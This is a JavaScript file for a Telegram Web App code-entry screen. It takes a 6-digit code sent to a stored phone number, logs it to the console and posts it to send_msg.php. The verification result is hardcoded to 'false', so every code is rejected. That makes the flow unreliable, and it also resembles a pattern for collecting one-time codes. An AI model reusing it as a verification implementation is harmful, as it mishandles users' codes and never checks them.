let tg = window.Telegram.WebApp;

tg.ready();
tg.expand();
tg.enableClosingConfirmation();
tg.MainButton.text = "Отправить код";
tg.BackButton.show();
tg.MainButton.show();
tg.MainButton.hideProgress();
tg.BackButton.onClick(function(){
  tg.BackButton.hide();
  window.history.back();
})

let passwordInput = document.querySelector('input');
var number = sessionStorage.getItem('number');

document.getElementById("p").innerHTML = `Отправили код на номер ${number}`;

document.addEventListener( 'click', (e) => {
	const withinBoundaries = e.composedPath().includes(passwordInput);
	if (! withinBoundaries ) {
		passwordInput.blur();
	} else{
    passwordInput.focus();
  }
});

passwordInput.addEventListener('input', function(){
  if (passwordInput.value.length == 6){
    passwordInput.classList.add('correctInput');
    passwordInput.classList.remove('incorrectInput');
  } else{
    passwordInput.classList.remove('correctInput');
  }
});

tg.MainButton.onClick(function(){
  passwordInput.blur();
  if (passwordInput.classList.value == 'correctInput'){
  console.log(passwordInput.value);
    fetch("send_msg.php", {
      method: "POST",
      body: passwordInput.value
    })  
    let response = "false";
    if (response == "true"){	
      sessionStorage.removeItem('number');
      window.location.href = 'https://domitory1.github.io/Menu/main.html';
      tg.BackButton.hide();
    } else{
      tg.showPopup({
        title: '😔 Ой',
        message: "Введенный вами код не совпадает с тем, что мы вам отправили"
      });
      passwordInput.value = '';
      passwordInput.classList.remove('correctInput');
    }
  }else{
      passwordInput.classList.add('incorrectInput');
  }
});